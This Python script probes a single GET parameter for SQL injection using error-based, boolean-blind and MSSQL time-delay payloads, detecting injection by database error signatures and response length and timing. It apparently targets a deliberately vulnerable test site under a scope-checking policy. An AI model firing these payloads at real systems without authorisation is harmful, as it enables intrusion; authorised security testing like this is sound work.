#!/usr/bin/env python3
"""
sqli_manual_probe.py — lightweight, dependency-light SQL-injection evidence
collector for a single GET parameter. This is the "manual" part of Phase 1
turned into a reproducible script: it does exactly what a tester does by hand
in a browser or with curl, but records the evidence deterministically.

It runs four classic differential tests and reports the signal for each:

  1. Baseline            — the untouched request (reference).
  2. Error-based         — append a lone single quote; look for a SQL error
                           string or a status/length change vs. baseline.
  3. Boolean-based blind — compare `' AND 1=1 -- ` (true) vs `' AND 1=2 -- `
                           (false). A content-length divergence is the tell.
  4. Time-based blind    — `' WAITFOR DELAY '0:0:5' -- ` (MSSQL). If the
                           response time jumps by ~the injected delay, the
                           parameter is executing attacker-controlled SQL.

NOTE: this is a *detector*, not an exploiter. It proves the flaw exists; sqlmap
(run under guardrails) does the confirmation and bounded enumeration.

Usage:
    python scripts/sqli_manual_probe.py --url "http://testaspnet.vulnweb.com/Comments.aspx?id=1" --param id
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from guardrails import Policy  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_OUT = os.path.normpath(os.path.join(HERE, "..", "evidence", "sqlmap", "manual_probe.json"))

# Signatures that strongly indicate a database error surfaced to the client.
SQL_ERROR_SIGNATURES = [
    r"Unclosed quotation mark",
    r"Incorrect syntax near",
    r"SqlException",
    r"System\.Data\.SqlClient",
    r"OLE DB",
    r"ODBC SQL Server Driver",
    r"Microsoft SQL Native Client",
    r"SQL Server",
    r"syntax error",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"PostgreSQL.*ERROR",
]
ERROR_RE = re.compile("|".join(SQL_ERROR_SIGNATURES), re.IGNORECASE)

# Payloads. `{v}` is the original parameter value.
PAYLOADS = {
    "error_quote":        "{v}'",
    "boolean_true":       "{v}' AND 1=1 -- ",
    "boolean_false":      "{v}' AND 1=2 -- ",
    "time_delay":         "{v}' WAITFOR DELAY '0:0:5' -- ",
    "numeric_true":       "{v} AND 1=1",
    "numeric_false":      "{v} AND 1=2",
}


def set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_q = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse(parsed._replace(query=new_q))


def fetch(session, url, timeout):
    t0 = time.perf_counter()
    try:
        r = session.get(url, timeout=timeout, allow_redirects=False)
        elapsed = time.perf_counter() - t0
        return {
            "url": url,
            "status": r.status_code,
            "length": len(r.content),
            "elapsed": round(elapsed, 3),
            "sql_error": bool(ERROR_RE.search(r.text)),
            "error_snippet": (ERROR_RE.search(r.text).group(0) if ERROR_RE.search(r.text) else None),
        }
    except requests.RequestException as exc:
        return {"url": url, "error": str(exc), "elapsed": round(time.perf_counter() - t0, 3)}


def probe(url: str, param: str, policy: Policy) -> dict:
    policy.assert_in_scope(url)
    session = requests.Session()
    session.headers.update({"User-Agent": policy.http.get("user_agent", "sqli-xss-lab")})
    timeout = max(policy.http.get("timeout_seconds", 20), 15)

    parsed = urlparse(url)
    original_value = parse_qs(parsed.query).get(param, ["1"])[0]

    results = {}
    # baseline
    results["baseline"] = fetch(session, url, timeout)
    # each payload
    for name, tmpl in PAYLOADS.items():
        payload_val = tmpl.format(v=original_value)
        test_url = set_param(url, param, payload_val)
        res = fetch(session, test_url, timeout)
        res["payload"] = payload_val
        results[name] = res
        time.sleep(0.2)

    # --- analysis -----------------------------------------------------------
    base = results["baseline"]
    analysis = {"parameter": param, "original_value": original_value, "signals": []}

    # error-based
    eq = results.get("error_quote", {})
    if eq.get("sql_error"):
        analysis["signals"].append(
            {"type": "error-based", "confidence": "high",
             "detail": f"SQL error surfaced on single-quote injection: {eq.get('error_snippet')!r}"}
        )
    elif eq.get("status") and base.get("status") and eq["status"] != base["status"]:
        analysis["signals"].append(
            {"type": "error-based", "confidence": "medium",
             "detail": f"status changed {base['status']} -> {eq['status']} on single quote"}
        )
    # Query-breaking signal: a lone single quote collapses the response body.
    # On this ASP.NET app the broken SQL yields an empty render (len 0) while the
    # baseline is a full page. A large negative length delta is a reliable tell
    # that the quote reached the SQL statement and broke its syntax.
    if (
        base.get("length")
        and eq.get("length") is not None
        and base["length"] > 500
        and eq["length"] <= max(10, base["length"] * 0.05)
    ):
        analysis["signals"].append(
            {"type": "error-based (query-breaking)", "confidence": "high",
             "detail": (f"single-quote injection collapsed response "
                        f"{base['length']} -> {eq['length']} bytes; the query breaks on a bare quote")}
        )

    # boolean-based (string)
    bt, bf = results.get("boolean_true", {}), results.get("boolean_false", {})
    if bt.get("length") is not None and bf.get("length") is not None:
        if bt["length"] != bf["length"]:
            analysis["signals"].append(
                {"type": "boolean-based-blind", "confidence": "high",
                 "detail": f"content length differs for 1=1 ({bt['length']}) vs 1=2 ({bf['length']})"}
            )

    # time-based
    td = results.get("time_delay", {})
    if td.get("elapsed") and base.get("elapsed") is not None:
        delta = td["elapsed"] - base["elapsed"]
        if delta >= 4.0:
            analysis["signals"].append(
                {"type": "time-based-blind", "confidence": "high",
                 "detail": f"response delayed by {delta:.1f}s on WAITFOR DELAY 5s injection"}
            )

    analysis["verdict"] = "LIKELY INJECTABLE" if analysis["signals"] else "no clear signal"
    return {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "target": url,
        "raw_results": results,
        "analysis": analysis,
    }


def main() -> int:
    ap = argparse.ArgumentParser(description="Manual SQLi differential probe (single GET param).")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--out", default=DEFAULT_OUT)
    args = ap.parse_args()

    policy = Policy.load()
    report = probe(args.url, args.param, policy)

    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2)

    a = report["analysis"]
    print(f"[sqli] target  : {report['target']}")
    print(f"[sqli] param   : {a['parameter']} (original={a['original_value']!r})")
    print(f"[sqli] verdict : {a['verdict']}")
    for s in a["signals"]:
        print(f"         - [{s['confidence']}] {s['type']}: {s['detail']}")
    print(f"[sqli] evidence: {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
